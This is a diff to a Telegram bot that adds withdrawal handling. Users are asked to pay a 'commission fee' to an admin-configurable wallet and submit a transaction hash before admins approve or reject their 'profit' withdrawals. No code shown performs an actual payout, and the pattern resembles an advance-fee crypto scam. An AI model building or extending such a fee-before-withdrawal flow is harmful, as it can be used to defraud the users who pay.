+        console.error('❌ withdraw_paid_fee error:', err);
+        await ctx.reply(`❌ Error opening fee verification: ${err.message}`);
+    }
+});
+
+bot.action('cancel_withdrawal', async (ctx) => {
+    await safeAnswerCbQuery(ctx, 'Cancelling withdrawal...');
+
+    const userId = ctx.from.id;
+
+    try {
+        const state = walletManager.userStates.get(userId);
+        const requestId = state?.requestId || null;
+
+        walletManager.userStates.delete(userId);
+
+        if (
+            typeof userTracker.getLatestPendingWithdrawalRequest !== 'function' &&
+            typeof userTracker.getWithdrawalRequestById !== 'function'
+        ) {
+            return ctx.reply('Withdrawal cancelled from local session. No database request was found.', Markup.inlineKeyboard([
+                [Markup.button.callback('◀️ Back to Wallet', 'wallet_menu')]
+            ]));
+        }
+
+        let pending = null;
+
+        if (requestId && typeof userTracker.getWithdrawalRequestById === 'function') {
+            pending = await userTracker.getWithdrawalRequestById(requestId);
+        }
+
+        if (!pending && typeof userTracker.getLatestPendingWithdrawalRequest === 'function') {
+            pending = await userTracker.getLatestPendingWithdrawalRequest(userId);
+        }
+
+        if (!pending) {
+            return ctx.reply('✅ Withdrawal cancelled.', Markup.inlineKeyboard([
+                [Markup.button.callback('◀️ Back to Wallet', 'wallet_menu')]
+            ]));
+        }
+
+        if (typeof userTracker.cancelWithdrawalRequest !== 'function') {
+            return ctx.reply('❌ Cancel function is missing from user-tracker.js.');
+        }
+
+        const result = await userTracker.cancelWithdrawalRequest(pending.id);
+
+        if (!result.ok) {
+            return ctx.reply(`❌ Could not cancel withdrawal: ${result.error}`);
+        }
+
+        await ctx.reply('✅ Withdrawal request cancelled.', Markup.inlineKeyboard([
+            [Markup.button.callback('◀️ Back to Wallet', 'wallet_menu')]
+        ]));
+    } catch (err) {
+        console.error('❌ cancel_withdrawal error:', err);
+        await ctx.reply(`❌ Cancel withdrawal error: ${err.message}`);
+    }
+});
+
+bot.action('copy_withdrawal_fee_address', async (ctx) => {
+    await safeAnswerCbQuery(ctx);
+
+    try {
+        const feeAddress = await getActiveWithdrawalFeeAddress();
+
+        if (!feeAddress) {
+            return ctx.reply('❌ Commission fee wallet is not configured yet. Please contact admin.');
+        }
+
+        await ctx.reply([
+            '📋 Commission Fee Wallet',
+            '',
+            feeAddress,
+            '',
+            `Network: ${WITHDRAWAL_FEE_NETWORK}`,
+            '',
+            'Send the required commission fee to this wallet before submitting your transaction hash.'
+        ].join('\n'), Markup.inlineKeyboard([
+            [Markup.button.callback('✅ I Paid Commission Fee', 'withdraw_paid_fee')],
+            [Markup.button.callback('❌ Cancel Withdrawal', 'cancel_withdrawal')]
+        ]));
+    } catch (err) {
+        console.error('❌ copy_withdrawal_fee_address error:', err);
+        await ctx.reply(`❌ Error loading fee wallet: ${err.message}`);
+    }
 });
 
 
@@ -5659,20 +6254,18 @@ bot.command('admin_pending', requireAdmin, async (ctx) => {
             return ctx.reply('✅ No pending wallet connection requests.');
         }
 
-        let message = `👛 *Pending Wallet Connections* (${connections.length})\n\n`;
+        let message = `Pending Wallet Connections (${connections.length})\n\n`;
 
         connections.forEach((c, i) => {
-            message += `*${i + 1}.* Telegram ID: \`${c.telegram_id}\`\n`;
-            message += `   Address: \`${c.address}\`\n`;
+            message += `${i + 1}. Telegram ID: ${c.telegram_id}\n`;
+            message += `   Address: ${c.address}\n`;
             message += `   Provider: ${c.provider || 'unknown'}\n`;
             message += `   Created: ${new Date(c.created_at).toLocaleString()}\n`;
-            message += `   Approve: \`/admin_approve ${c.telegram_id} 500 note\`\n`;
-            message += `   Reject: \`/admin_reject ${c.telegram_id} note\`\n\n`;
+            message += `   Approve: /admin_approve ${c.telegram_id} 500 note\n`;
+            message += `   Reject: /admin_reject ${c.telegram_id} note\n\n`;
         });
 
-        await ctx.replyWithMarkdown(message, {
-            disable_web_page_preview: true
-        });
+        await ctx.reply(message);
     } catch (err) {
         console.error('❌ /admin_pending error:', err);
         await ctx.reply(`❌ Pending connections error: ${err.message}`);
@@ -6368,6 +6961,257 @@ bot.action(/admin_trades_(\d+)/, requireAdmin, async (ctx) => {
     });
 
     await ctx.replyWithMarkdown(message);
+});
+
+
+// ═══════════════════════════════════════════════════
+// 💸 ADMIN WITHDRAWAL COMMANDS
+// ═══════════════════════════════════════════════════
+
+bot.command('admin_withdrawals', requireAdmin, async (ctx) => {
+    try {
+        console.log('[ADMIN_WITHDRAWALS] Called by admin:', ctx.from.id);
+
+        if (typeof userTracker.getPendingWithdrawalRequests !== 'function') {
+            return ctx.reply('❌ Withdrawal functions are missing from user-tracker.js.');
+        }
+
+        const requests = await userTracker.getPendingWithdrawalRequests(25);
+
+        if (!requests || requests.length === 0) {
+            return ctx.reply('✅ No pending withdrawal requests.');
+        }
+
+        let msg = `Pending Withdrawal Requests (${requests.length})\n\n`;
+
+        for (const r of requests) {
+            msg += `Request ID: ${r.id}\n`;
+            msg += `User: ${r.telegram_id}\n`;
+            msg += `Wallet: ${r.wallet_address}\n`;
+            msg += `Provider: ${r.provider || 'unknown'}\n`;
+            msg += `Profit: ${formatUsd(r.profit_usd)}\n`;
+            msg += `Fee (${WITHDRAWAL_FEE_PERCENT}%): ${formatUsd(r.fee_usd)}\n`;
+            msg += `Net: ${formatUsd(r.net_usd)}\n`;
+            msg += `Status: ${withdrawalStatusLabel(r.status)}\n`;
+            msg += `Fee TX Hash: ${r.fee_tx_hash || 'none'}\n`;
+            msg += `Created: ${new Date(r.created_at).toLocaleString()}\n`;
+            msg += `Approve: /admin_approve_withdrawal ${r.id}\n`;
+            msg += `Reject: /admin_reject_withdrawal ${r.id} note\n\n`;
+        }
+
+        await ctx.reply(msg);
+    } catch (err) {
+        console.error('❌ /admin_withdrawals error:', err);
+        await ctx.reply(`❌ Withdrawal list error: ${err.message}`);
+    }
+});
+
+bot.command('admin_approve_withdrawal', requireAdmin, async (ctx) => {
+    try {
+        const parts = ctx.message.text.trim().split(/\s+/);
+        const requestId = parts[1];
+        const note = parts.slice(2).join(' ') || null;
+
+        if (!requestId) {
+            return ctx.reply('Usage: /admin_approve_withdrawal <request_id> optional note');
+        }
+
+        if (typeof userTracker.approveWithdrawalRequest !== 'function') {
+            return ctx.reply('❌ Withdrawal approval function is missing.');
+        }
+
+        const result = await userTracker.approveWithdrawalRequest(requestId, ctx.from.id, note);
+
+        if (!result.ok) {
+            return ctx.reply(`❌ Approval failed: ${result.error}`);
+        }
+
+        const request = result.data;
+
+        await ctx.reply([
+            '✅ Withdrawal Approved',
+            '',
+            `Request ID: ${request.id}`,
+            `User: ${request.telegram_id}`,
+            `Wallet: ${request.wallet_address}`,
+            `Profit Withdrawn: ${formatUsd(request.profit_usd)}`,
+            `Commission Fee: ${formatUsd(request.fee_usd)}`,
+            `Net After Fee: ${formatUsd(request.net_usd)}`,
+            note ? `Note: ${note}` : null
+        ].filter(Boolean).join('\n'));
+
+        try {
+            await bot.telegram.sendMessage(request.telegram_id, [
+                '✅ Withdrawal Approved',
+                '',
+                'Your withdrawal request has been approved.',
+                '',
+                `Profit withdrawn: ${formatUsd(request.profit_usd)}`,
+                `Commission fee paid: ${formatUsd(request.fee_usd)}`,
+                `Net after fee: ${formatUsd(request.net_usd)}`,
+                `Withdraw wallet: ${request.wallet_address}`,
+                '',
+                note ? `Admin note: ${note}` : 'Your profit withdrawal is now processed.'
+            ].filter(Boolean).join('\n'), Markup.inlineKeyboard([
+                [Markup.button.callback('💰 View Profit', 'profit_menu')],
+                [Markup.button.callback('◀️ Dashboard', 'dashboard')]
+            ]));
+        } catch (notifyErr) {
+            console.error(`❌ Failed to notify user ${request.telegram_id} about approved withdrawal:`, notifyErr.message);
+        }
+    } catch (err) {
+        console.error('❌ /admin_approve_withdrawal error:', err);
+        await ctx.reply(`❌ Approval error: ${err.message}`);
+    }
+});
+
+bot.command('admin_reject_withdrawal', requireAdmin, async (ctx) => {
+    try {
+        const parts = ctx.message.text.trim().split(/\s+/);
+        const requestId = parts[1];
+        const note = parts.slice(2).join(' ') || null;
+
+        if (!requestId) {
+            return ctx.reply('Usage: /admin_reject_withdrawal <request_id> optional note');
+        }
+
+        if (typeof userTracker.rejectWithdrawalRequest !== 'function') {
+            return ctx.reply('❌ Withdrawal rejection function is missing.');
+        }
+
+        const result = await userTracker.rejectWithdrawalRequest(requestId, ctx.from.id, note);
+
+        if (!result.ok) {
+            return ctx.reply(`❌ Rejection failed: ${result.error}`);
+        }
+
+        const request = result.data;
+
+        await ctx.reply([
+            '❌ Withdrawal Rejected',
+            '',
+            `Request ID: ${request.id}`,
+            `User: ${request.telegram_id}`,
+            `Wallet: ${request.wallet_address}`,
+            `Profit: ${formatUsd(request.profit_usd)}`,
+            note ? `Note: ${note}` : null
+        ].filter(Boolean).join('\n'));
+
+        try {
+            await bot.telegram.sendMessage(request.telegram_id, [
+                '❌ Withdrawal Rejected',
+                '',
+                'Your withdrawal request was rejected.',
+                '',
+                `Requested wallet: ${request.wallet_address}`,
+                `Profit balance: ${formatUsd(request.profit_usd)}`,
+                '',
+                note ? `Admin note: ${note}` : 'Please contact support for more details.'
+            ].filter(Boolean).join('\n'), Markup.inlineKeyboard([
+                [Markup.button.callback('💰 View Profit', 'profit_menu')],
+                [Markup.button.callback('◀️ Dashboard', 'dashboard')]
+            ]));
+        } catch (notifyErr) {
+            console.error(`❌ Failed to notify user ${request.telegram_id} about rejected withdrawal:`, notifyErr.message);
+        }
+    } catch (err) {
+        console.error('❌ /admin_reject_withdrawal error:', err);
+        await ctx.reply(`❌ Rejection error: ${err.message}`);
+    }
+});
+
+// ═══════════════════════════════════════════════════
+// 💸 ADMIN WITHDRAWAL FEE WALLET COMMANDS
+// ═══════════════════════════════════════════════════
+
+bot.command('admin_fee_address', requireAdmin, async (ctx) => {
+    try {
+        console.log('[ADMIN_FEE_ADDRESS] Called by admin:', ctx.from.id);
+
+        const current = await getActiveWithdrawalFeeAddress();
+
+        if (!current) {
+            return ctx.reply([
+                'Current withdrawal fee wallet: Not configured',
+                '',
+                'Set it with:',
+                '/admin_set_fee_address 0xYourFeeWalletAddress'
+            ].join('\n'));
+        }
+
+        return ctx.reply([
+            'Current withdrawal fee wallet:',
+            current,
+            '',
+            `Network: ${WITHDRAWAL_FEE_NETWORK}`,
+            '',
+            'Change it with:',
+            '/admin_set_fee_address 0xNewFeeWalletAddress',
+            '',
+            'Clear/disable it with:',
+            '/admin_set_fee_address none'
+        ].join('\n'));
+    } catch (err) {
+        console.error('❌ /admin_fee_address error:', err);
+        await ctx.reply(`❌ Error loading fee wallet: ${err.message}`);
+    }
+});
+
+bot.command('admin_set_fee_address', requireAdmin, async (ctx) => {
+    try {
+        console.log('[ADMIN_SET_FEE_ADDRESS] Called by admin:', ctx.from.id);
+
+        const parts = ctx.message.text.trim().split(/\s+/);
+        const rawAddress = parts[1] || '';
+
+        if (!rawAddress) {
+            return ctx.reply([
+                'Usage:',
+                '/admin_set_fee_address 0xYourFeeWalletAddress',
+                '',
+                'To clear/disable:',
+                '/admin_set_fee_address none'
+            ].join('\n'));
+        }
+
+        const address = String(rawAddress).trim().toLowerCase() === 'none'
+            ? ''
+            : String(rawAddress).trim();
+
+        if (typeof userTracker.setWithdrawalFeeAddress !== 'function') {
+            return ctx.reply('❌ setWithdrawalFeeAddress function is missing from user-tracker.js.');
+        }
+
+        const result = await userTracker.setWithdrawalFeeAddress(address);
+
+        if (!result.ok) {
+            return ctx.reply(`❌ Failed to set fee wallet: ${result.error}`);
+        }
+
+        await walletManager.logAdminAction(ctx.from.id, 'SET_WITHDRAWAL_FEE_ADDRESS', null);
+
+        if (!result.value) {
+            return ctx.reply([
+                '✅ Withdrawal fee wallet cleared.',
+                '',
+                'Users will now see that the commission fee wallet is not configured.',
+                'Set it again with:',
+                '/admin_set_fee_address 0xYourFeeWalletAddress'
+            ].join('\n'));
+        }
+
+        return ctx.reply([
+            '✅ Withdrawal fee wallet updated.',
+            '',
+            `New fee wallet: ${result.value}`,
+            `Network: ${WITHDRAWAL_FEE_NETWORK}`,
+            '',
+            'This change is live immediately. No restart required.'
+        ].join('\n'));
+    } catch (err) {
+        console.error('❌ /admin_set_fee_address error:', err);
+        await ctx.reply(`❌ Error setting fee wallet: ${err.message}`);
+    }
 });
 
 
